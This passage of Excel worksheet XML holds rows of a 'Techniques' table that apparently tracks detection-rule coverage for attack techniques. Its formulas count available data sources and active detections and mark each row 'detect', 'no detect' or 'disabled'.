        <f t="array" ref="M273">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N273" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O273" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P273" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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73" t="s">
        <v>386</v>
      </c>
      <c r="U273" t="s">
        <v>1447</v>
      </c>
      <c r="V273" t="s">
        <v>1448</v>
      </c>
      <c r="W273" t="b">
        <v>1</v>
      </c>
      <c r="X273" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="274" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A274" t="s">
        <v>1416</v>
      </c>
      <c r="B274" t="s">
        <v>1449</v>
      </c>
      <c r="C274" t="s">
        <v>1450</v>
      </c>
      <c r="D274" t="s">
        <v>6</v>
      </c>
      <c r="E274" t="s">
        <v>1451</v>
      </c>
      <c r="F274" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G274" s="9" cm="1">
        <f t="array" ref="G274">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H274" s="9" t="str" cm="1">
        <f t="array" ref="H274">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I274" s="9" t="str" cm="1">
        <f t="array" ref="I274">IF(SUM(IF($C274=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C274=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J274" s="9" t="str" cm="1">
        <f t="array" ref="J27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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M274" s="9" cm="1">
        <f t="array" ref="M274">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N274" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O274" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P274" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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74" t="s">
        <v>386</v>
      </c>
      <c r="U274" t="s">
        <v>1452</v>
      </c>
      <c r="V274" t="s">
        <v>1453</v>
      </c>
      <c r="W274" t="b">
        <v>1</v>
      </c>
      <c r="X274" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="275" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A275" t="s">
        <v>1416</v>
      </c>
      <c r="B275" t="s">
        <v>1454</v>
      </c>
      <c r="C275" t="s">
        <v>1455</v>
      </c>
      <c r="D275" t="s">
        <v>6</v>
      </c>
      <c r="E275" t="s">
        <v>463</v>
      </c>
      <c r="F275" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G275" s="9" cm="1">
        <f t="array" ref="G275">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H275" s="9" t="str" cm="1">
        <f t="array" ref="H275">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I275" s="9" t="str" cm="1">
        <f t="array" ref="I275">IF(SUM(IF($C275=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C275=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J275" s="9" t="str" cm="1">
        <f t="array" ref="J27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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M275" s="9" cm="1">
        <f t="array" ref="M275">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N275" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O275" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P275" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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75" t="s">
        <v>386</v>
      </c>
      <c r="U275" t="s">
        <v>1456</v>
      </c>
      <c r="V275" t="s">
        <v>1457</v>
      </c>
      <c r="W275" t="b">
        <v>1</v>
      </c>
      <c r="X275" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="276" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A276" t="s">
        <v>1416</v>
      </c>
      <c r="B276" t="s">
        <v>1458</v>
      </c>
      <c r="C276" t="s">
        <v>285</v>
      </c>
      <c r="D276" t="s">
        <v>6</v>
      </c>
      <c r="E276" t="s">
        <v>1446</v>
      </c>
      <c r="F276" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G276" s="9" cm="1">
        <f t="array" ref="G276">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H276" s="9" t="str" cm="1">
        <f t="array" ref="H276">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I276" s="9" t="str" cm="1">
        <f t="array" ref="I276">IF(SUM(IF($C276=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C276=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J276" s="9" t="str" cm="1">
        <f t="array" ref="J27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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M276" s="9" cm="1">
        <f t="array" ref="M276">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N276" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O276" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P276" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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76" t="s">
        <v>386</v>
      </c>
      <c r="U276" t="s">
        <v>1459</v>
      </c>
      <c r="V276" t="s">
        <v>1460</v>
      </c>
      <c r="W276" t="b">
        <v>1</v>
      </c>
      <c r="X276" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="277" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A277" t="s">
        <v>1416</v>
      </c>
      <c r="B277" t="s">
        <v>1461</v>
      </c>
      <c r="C277" t="s">
        <v>286</v>
      </c>
      <c r="D277" t="s">
        <v>6</v>
      </c>
      <c r="E277" t="s">
        <v>1462</v>
      </c>
      <c r="F277" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G277" s="9" cm="1">
        <f t="array" ref="G277">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H277" s="9" t="str" cm="1">
        <f t="array" ref="H277">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I277" s="9" t="str" cm="1">
        <f t="array" ref="I277">IF(SUM(IF($C277=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C277=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J277" s="9" t="str" cm="1">
        <f t="array" ref="J27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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M277" s="9" cm="1">
        <f t="array" ref="M277">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N277" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O277" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P277" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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77" t="s">
        <v>386</v>
      </c>
      <c r="U277" t="s">
        <v>1463</v>
      </c>
      <c r="V277" t="s">
        <v>1464</v>
      </c>
      <c r="W277" t="b">
        <v>1</v>
      </c>
      <c r="X277" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="278" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A278" t="s">
        <v>1416</v>
      </c>
      <c r="B278" t="s">
        <v>1465</v>
      </c>
      <c r="C278" t="s">
        <v>1466</v>
      </c>
      <c r="D278" t="s">
        <v>6</v>
      </c>
      <c r="E278" t="s">
        <v>463</v>
      </c>
      <c r="F278" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G278" s="9" cm="1">
        <f t="array" ref="G278">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H278" s="9" t="str" cm="1">
        <f t="array" ref="H278">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I278" s="9" t="str" cm="1">
        <f t="array" ref="I278">IF(SUM(IF($C278=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C278=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J278" s="9" t="str" cm="1">
        <f t="array" ref="J27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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M278" s="9" cm="1">
        <f t="array" ref="M278">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N278" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O278" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P278" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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78" t="s">
        <v>386</v>
      </c>
      <c r="U278" t="s">
        <v>1467</v>
      </c>
      <c r="V278" t="s">
        <v>1468</v>
      </c>
      <c r="W278" t="b">
        <v>1</v>
      </c>
      <c r="X278" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="279" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A279" t="s">
        <v>1416</v>
      </c>
      <c r="B279" t="s">
        <v>1469</v>
      </c>
      <c r="C279" t="s">
        <v>1470</v>
      </c>
      <c r="D279" t="s">
        <v>6</v>
      </c>
      <c r="E279" t="s">
        <v>463</v>
      </c>
      <c r="F279" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G279" s="9" cm="1">
        <f t="array" ref="G279">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H279" s="9" t="str" cm="1">
        <f t="array" ref="H279">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I279" s="9" t="str" cm="1">
        <f t="array" ref="I279">IF(SUM(IF($C279=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C279=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J279" s="9" t="str" cm="1">
        <f t="array" ref="J27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79" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M279" s="9" cm="1">
        <f t="array" ref="M279">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N279" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O279" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P279" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S27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79" t="s">
        <v>386</v>
      </c>
      <c r="U279" t="s">
        <v>1471</v>
      </c>
      <c r="V279" t="s">
        <v>1472</v>
      </c>
      <c r="W279" t="b">
        <v>1</v>
      </c>
      <c r="X279" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="280" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A280" t="s">
        <v>1416</v>
      </c>
      <c r="B280" t="s">
        <v>1473</v>
      </c>
      <c r="C280" t="s">
        <v>1474</v>
      </c>
      <c r="D280" t="s">
        <v>6</v>
      </c>
      <c r="E280" t="s">
        <v>1422</v>
      </c>
      <c r="F280" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G280" s="9" cm="1">
        <f t="array" ref="G280">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H280" s="9" t="str" cm="1">
        <f t="array" ref="H280">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I280" s="9" t="str" cm="1">
        <f t="array" ref="I280">IF(SUM(IF($C280=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C280=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J280" s="9" t="str" cm="1">
        <f t="array" ref="J28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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M280" s="9" cm="1">
        <f t="array" ref="M280">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N280" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O280" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P280" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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80" t="s">
        <v>386</v>
      </c>
      <c r="U280" t="s">
        <v>1475</v>
      </c>
      <c r="V280" t="s">
        <v>1476</v>
      </c>
      <c r="W280" t="b">
        <v>1</v>
      </c>
      <c r="X280" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="281" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A281" t="s">
        <v>1416</v>
      </c>
      <c r="B281" t="s">
        <v>1477</v>
      </c>
      <c r="C281" t="s">
        <v>1478</v>
      </c>
      <c r="D281" t="s">
        <v>6</v>
      </c>
      <c r="E281" t="s">
        <v>463</v>
      </c>
      <c r="F281" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G281" s="9" cm="1">
        <f t="array" ref="G281">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H281" s="9" t="str" cm="1">
        <f t="array" ref="H281">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I281" s="9" t="str" cm="1">
        <f t="array" ref="I281">IF(SUM(IF($C281=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C281=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J281" s="9" t="str" cm="1">
        <f t="array" ref="J28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81" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M281" s="9" cm="1">
        <f t="array" ref="M281">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N281" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O281" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P281" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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81" t="s">
        <v>368</v>
      </c>
      <c r="U281" t="s">
        <v>1479</v>
      </c>
      <c r="W281" t="b">
        <v>1</v>
      </c>
      <c r="X281" t="s">
        <v>1416</v>
      </c>
    </row>
    <row r="282" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A282" t="s">
        <v>1480</v>
      </c>
      <c r="B282" t="s">
        <v>1480</v>
      </c>
      <c r="C282" t="s">
        <v>175</v>
      </c>
      <c r="D282" t="s">
        <v>11</v>
      </c>
      <c r="E282" t="s">
        <v>1353</v>
      </c>
      <c r="F282" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G282" s="9" cm="1">
        <f t="array" ref="G282">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H282" s="9" cm="1">
        <f t="array" ref="H282">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I282" s="9" t="str" cm="1">
        <f t="array" ref="I282">IF(SUM(IF($C282=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C282=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J282" s="9" t="str" cm="1">
        <f t="array" ref="J28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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M282" s="9" cm="1">
        <f t="array" ref="M282">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N282" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O282" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P282" s="14" t="str">
